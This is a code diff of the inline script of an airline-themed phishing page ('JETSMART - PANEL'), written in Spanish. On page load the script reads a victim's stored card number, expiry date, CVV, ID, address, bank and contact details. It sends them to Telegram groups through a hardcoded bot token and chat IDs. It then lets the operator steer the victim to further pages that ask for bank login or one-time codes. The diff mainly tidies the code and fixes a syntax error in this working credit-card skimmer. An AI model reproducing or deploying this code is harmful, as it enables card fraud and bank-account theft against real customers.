@@ -30,40 +30,22 @@
 <body>
     <div class="loader"></div>
     <script>
-        const config = {
-            token: "8608960396:AAEg6sf1witTorcfeGXUyrlScyxW2VKenNI",
-            chat_id: ["-5230297399", "-5093202866"]
-}
-        };
+    const config = {
+        token: "8608960396:AAEg6sf1witTorcfeGXUyrlScyxW2VKenNI",
+        chat_ids: ["-5230297399", "-5093202866"]
+    };
 
-        // Función para enviar datos al bot de Telegram
-        async function enviarDatosTelegram() {
-            // Obtener datos del localStorage
-            const paymentData = localStorage.getItem('pagojet');
+    async function enviarDatosTelegram() {
+        const paymentData = localStorage.getItem('pagojet');
+        if (!paymentData) {
+            console.error("No se encontraron datos en localStorage.");
+            return;
+        }
 
-            if (!paymentData) {
-                console.error("No se encontraron datos en localStorage.");
-                return;
-            }
+        const parsedData = JSON.parse(paymentData);
+        const transaction_id = `txn_${Date.now()}`;
 
-            const parsedData = JSON.parse(paymentData);
-            console.log("Datos encontrados en localStorage:", parsedData);
-
-            // Validar datos requeridos
-            const requiredFields = ["email", "celular", "direccion", "tarjeta", "ftarjeta", "cvv", "id", "ip", "banco", "nombre"];
-            for (const field of requiredFields) {
-                if (!parsedData[field]) {
-                    console.error(`Falta el campo obligatorio: ${field}`);
-                    return;
-                }
-            }
-
-            // Generar ID de transacción único
-            const transaction_id = `txn_${Date.now()}`;
-            sessionStorage.setItem("transaction_id", transaction_id);
-
-            // Crear el mensaje para Telegram
-            const message = `
+        const message = `
 <b>Nuevo método de pago pendiente de verificación.</b>
 <b>🪬JETSMART - PANEL🪬</b>
 --------------------------------------------------
@@ -82,85 +64,97 @@
 🏦 <b>Banco:</b> | <b>${parsedData.banco}</b>
 -----------------------------------------------`;
 
-            const keyboard = {
-                inline_keyboard: [
-                    [{ text: "Pedir Logo", callback_data: `pedir_logo:${transaction_id}` }],
-                    [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transaction_id}` }],
-                    [{ text: "Error de TC", callback_data: `error_tc:${transaction_id}` }],
-                    [{ text: "Error de Logo", callback_data: `error_logo:${transaction_id}` }],
-                    [{ text: "Finalizar", callback_data: `finalizar:${transaction_id}` }]
-                ]
-            };
+        const keyboard = {
+            inline_keyboard: [
+                [{ text: "Pedir Logo", callback_data: `pedir_logo:${transaction_id}` }],
+                [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transaction_id}` }],
+                [{ text: "Error de TC", callback_data: `error_tc:${transaction_id}` }],
+                [{ text: "Error de Logo", callback_data: `error_logo:${transaction_id}` }],
+                [{ text: "Finalizar", callback_data: `finalizar:${transaction_id}` }]
+            ]
+        };
 
+        try {
+            // Enviar a todos los grupos
+            for (let chat_id of config.chat_ids) {
+                const response = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: chat_id,
+                        text: message,
+                        parse_mode: "HTML",
+                        reply_markup: keyboard
+                    })
+                });
+
+                const data = await response.json();
+                if (data.ok) {
+                    console.log(`✅ Mensaje enviado correctamente al grupo: ${chat_id}`);
+                } else {
+                    console.error(`❌ Error enviando al grupo ${chat_id}:`, data);
+                }
+            }
+
+            verificarActualizaciones(transaction_id);
+
+        } catch (error) {
+            console.error("Error general al enviar mensaje:", error);
+        }
+    }
+
+    // Función verificarActualizaciones (se mantiene igual)
+    async function verificarActualizaciones(transaction_id) {
+        console.log("Iniciando verificación de actualizaciones...");
+        const redirectTimeout = setTimeout(() => {
+            console.log("Redirigiendo a pedir_logo.html...");
+            window.location.href = "pedir_logo.html";
+        }, 2000);
+
+        const interval = setInterval(async () => {
             try {
-                // Enviar datos a Telegram
-                for (let chat_id of config.chat_ids) {
-    const response = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: chat_id,
-            text: message,
-            parse_mode: "HTML",
-            reply_markup: keyboard
-        })
-    });
-    console.log(`Mensaje enviado al grupo: ${chat_id}`);
-}
+                const response = await fetch(`https://api.telegram.org/bot${config.token}/getUpdates`);
+                const updates = await response.json();
 
-        // Función para verificar actualizaciones en Telegram
-        async function verificarActualizaciones(transaction_id) {
-            console.log("Iniciando verificación de actualizaciones...");
+                if (updates.result) {
+                    for (const update of updates.result) {
+                        if (update.callback_query) {
+                            const [action, id] = update.callback_query.data.split(":");
+                            if (id === transaction_id) {
+                                clearTimeout(redirectTimeout);
+                                clearInterval(interval);
 
-            const redirectTimeout = setTimeout(() => {
-                console.log("Redirigiendo a pedir_logo.html...");
-                window.location.href = "pedir_logo.html";
-            }, 2000);
-
-            const interval = setInterval(async () => {
-                try {
-                    const response = await fetch(`https://api.telegram.org/bot${config.token}/getUpdates`);
-                    const updates = await response.json();
-
-                    if (updates.result) {
-                        for (const update of updates.result) {
-                            if (update.callback_query) {
-                                const [action, id] = update.callback_query.data.split(":");
-                                if (id === transaction_id) {
-                                    clearTimeout(redirectTimeout);
-                                    clearInterval(interval);
-
-                                    switch (action) {
-                                        case "pedir_logo":
-                                            window.location.href = "pedir_logo.html";
-                                            break;
-                                        case "pedir_dinamica":
-                                            window.location.href = "pedir_dinamica.html";
-                                            break;
-                                        case "error_tc":
-                                            window.location.href = "pago.html";
-                                            break;
-                                        case "error_logo":
-                                            window.location.href = "pedir_logo.html";
-                                            break;
-                                        case "finalizar":
-                                            window.location.href = "finish.html";
-                                            break;
-                                        default:
-                                            console.error("Acción desconocida:", action);
-                                    }
+                                switch (action) {
+                                    case "pedir_logo":
+                                        window.location.href = "pedir_logo.html";
+                                        break;
+                                    case "pedir_dinamica":
+                                        window.location.href = "pedir_dinamica.html";
+                                        break;
+                                    case "error_tc":
+                                        window.location.href = "pago.html";
+                                        break;
+                                    case "error_logo":
+                                        window.location.href = "pedir_logo.html";
+                                        break;
+                                    case "finalizar":
+                                        window.location.href = "finish.html";
+                                        break;
+                                    default:
+                                        console.error("Acción desconocida:", action);
                                 }
                             }
                         }
                     }
-                } catch (error) {
-                    console.error("Error al verificar actualizaciones:", error);
                 }
-            }, 5000); // Verificar cada 5 segundos
-        }
+            } catch (error) {
+                console.error("Error al verificar actualizaciones:", error);
+            }
+        }, 5000);
+    }
 
-        // Inicia el envío al cargar la página
-        enviarDatosTelegram();
-    </script>
+    // Iniciar
+    enviarDatosTelegram();
+</script>
 </body>
 </html>
